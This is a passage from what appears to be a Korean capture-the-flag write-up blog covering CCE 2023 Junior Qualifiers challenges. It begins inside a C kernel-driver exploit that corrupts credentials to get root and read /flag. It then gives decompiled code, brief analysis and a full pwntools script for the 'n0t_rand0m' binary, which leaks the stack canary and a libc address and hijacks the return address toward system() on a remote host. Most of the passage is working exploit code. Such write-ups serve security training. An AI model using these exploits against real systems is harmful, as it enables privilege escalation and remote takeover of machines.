</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;string.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;sys/ioctl.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdint.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;sys/wait.h&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>struct ioctl_info {
</span></span><span style="display:flex;"><span>    uint32_t idx;
</span></span><span style="display:flex;"><span>    uint32_t dummy;
</span></span><span style="display:flex;"><span>    uint64_t src;
</span></span><span style="display:flex;"><span>    uint64_t sz;
</span></span><span style="display:flex;"><span>    uint64_t off;
</span></span><span style="display:flex;"><span>}__attribute__((packed));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CREATE 0x10003</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MODIFY 0x10002</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DELETE 0x10004</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>int main()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    int fd;
</span></span><span style="display:flex;"><span>    struct ioctl_info io;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/K-exploit&#34;</span>, O_RDWR)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;ERR&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    char <span style="color:#f92672">*</span> buf <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0xc0</span>);
</span></span><span style="display:flex;"><span>    strcpy(buf, <span style="color:#e6db74">&#34;DEADBEEF0&#34;</span>);
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>src <span style="color:#f92672">=</span> (int64_t)buf;
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sz <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa0</span>; <span style="color:#f92672">//</span> cred
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((int)ioctl(fd, CREATE, <span style="color:#f92672">&amp;</span>io) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>idx <span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        ioctl(fd, DELETE, <span style="color:#f92672">&amp;</span>io);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((int)ioctl(fd, CREATE, <span style="color:#f92672">&amp;</span>io) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>            puts(<span style="color:#e6db74">&#34;ERR&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    char <span style="color:#f92672">*</span> flag <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span>    int fl <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    int pid[<span style="color:#ae81ff">0x100</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(int i <span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x100</span>;i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>        pid[i] <span style="color:#f92672">=</span> fork();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (pid[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>            sleep(<span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (getuid() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>                fl <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                puts(<span style="color:#e6db74">&#34;priv escalated&#34;</span>);
</span></span><span style="display:flex;"><span>                int f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/flag&#34;</span>,O_RDONLY);
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span>,f);
</span></span><span style="display:flex;"><span>                read(f, flag,<span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span>                puts(flag);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (pid[i] <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>            puts(<span style="color:#e6db74">&#34;fork error&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    memcpy(buf,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">40</span>);
</span></span><span style="display:flex;"><span>    int v;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (int i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">30</span>;i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>off <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0xac480</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0xc0</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>)<span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> i;
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sz <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((int)ioctl(fd, MODIFY, <span style="color:#f92672">&amp;</span>io) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>            puts(<span style="color:#e6db74">&#34;ERR&#34;</span>);
</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;trying&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    int status;
</span></span><span style="display:flex;"><span>    wait(<span style="color:#f92672">&amp;</span>status);
</span></span><span style="display:flex;"><span>    close(fd);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(fl <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;NOPE&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img loading="lazy" src="/blog/CCE_2023_Junior_Quals/image.png" alt=""  />

<code>cce2023{y0u_kn0w_Linux_k3rn3l_3xploit?}</code></p>
<h1 id="n0t_rand0m">n0t_rand0m<a hidden class="anchor" aria-hidden="true" href="#n0t_rand0m">#</a></h1>
<h2 id="analysis-1">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdin, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;what your name?&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">8uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hello %s&#34;</span>, buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;write comment&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, comment, <span style="color:#ae81ff">0x18uLL</span>);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(<span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">srand</span>(v3);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      nbytes_4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">%</span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;random number : %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nbytes_4);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;continue? (yes or no) &#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, haystack, <span style="color:#ae81ff">8uLL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strstr</span>(haystack, <span style="color:#e6db74">&#34;no&#34;</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strstr</span>(haystack, <span style="color:#e6db74">&#34;yes&#34;</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( nbytes_4 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;comment : %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, comment);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;name : %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;write new comment&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, comment, nbytes);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;write new name&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, nbytes);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        nbytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(comment);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nbytes);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        nbytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(buf);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nbytes);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">7u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_401296</span>(nbytes);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_15;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">8u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_401345</span>(nbytes);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_15;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">9u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>LABEL_15:
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xAu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_4013B1</span>(buf);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_401296</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+18h] [rbp-28h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v3[<span style="color:#ae81ff">24</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-20h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;one more time what your name&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, a1);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;ok %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;did you have fun?&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, v3, a1);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;ok...bye&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v4 <span style="color:#f92672">-</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_4013B1</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">system</span>(a1);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>일반적으로는 %9 + 1 때문에 0xa에는 접근할 수 없다.</p>
<h2 id="exploitation-1">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+8h] [rbp-28h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> comment[<span style="color:#ae81ff">24</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-20h] BYREF
</span></span></span></code></pre></div><p>comment와 buf가 인접해있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        nbytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(comment);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nbytes);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        nbytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(buf);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nbytes);
</span></span></code></pre></div><p>nbytes를 strlen으로 늘릴 수 있다.
인접해있기에 strlen(buf)로 늘려주면 nbytes를 늘릴 수 있다.</p>
<p>sub_401296타고 들어가서 canary leak하고 ret를 system 쪽으로 뛰면 된다.</p>
<h3 id="exploit-script-1">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script-1">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> CDLL
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./n0t_rand0m&#39;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#39;./n0t_rand0m&#39;,env={&#34;LD_PRELOAD&#34;:&#34;./libc.so.6&#34;})</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;20.196.192.95&#34;</span>,<span style="color:#ae81ff">8888</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">func</span>(n):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;random number : &#39;</span>)
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> int(rvl()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r <span style="color:#f92672">==</span> n:
</span></span><span style="display:flex;"><span>            sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;continue? (yes or no)&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;no&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;continue? (yes or no)&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;yes&#39;</span>)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>rvu <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
</span></span><span style="display:flex;"><span>rvl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> : p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;what your name?&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># stack = u64(rvu(b&#34;\x7f&#34;).ljust(8,b&#39;\x00&#39;))</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># success(hex(stack-0x2b1)) # local leak</span>
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;write comment&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span>)
</span></span><span style="display:flex;"><span>func(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>func(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>func(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;write new comment&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>func(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>func(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;write new comment&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span>)
</span></span><span style="display:flex;"><span>func(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>func(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>)
</span></span><span style="display:flex;"><span>l <span style="color:#f92672">=</span>u64(rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#75715e">#remote leak</span>
</span></span><span style="display:flex;"><span>success(hex(l))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># func(4)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># sa(b&#39;write new name&#39;,b&#39;sh\x00&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># func(7)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># sa(b&#39;one more time what your name&#39;,b&#39;A&#39;*0x21)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># rvu(b&#39;A&#39;*0x21)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># can = b&#39;\x00&#39;+p.recv(7)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># sa(b&#39;did you have fun?&#39;,b&#39;A&#39;*0x18 + can +p64(stack-0x2b1+0x28)+p64(0x04016B0)) </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>func(<span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;one more time what your name&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x21</span>)
</span></span><span style="display:flex;"><span>rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x21</span>)
</span></span><span style="display:flex;"><span>can <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;did you have fun?&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> can <span style="color:#f92672">+</span>p64(l <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1ae908</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x04016B0</span>)) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>로컬에선 릭이 됐는데, 리모트에선 안되길래 그냥 따로 릭을 진행했다.
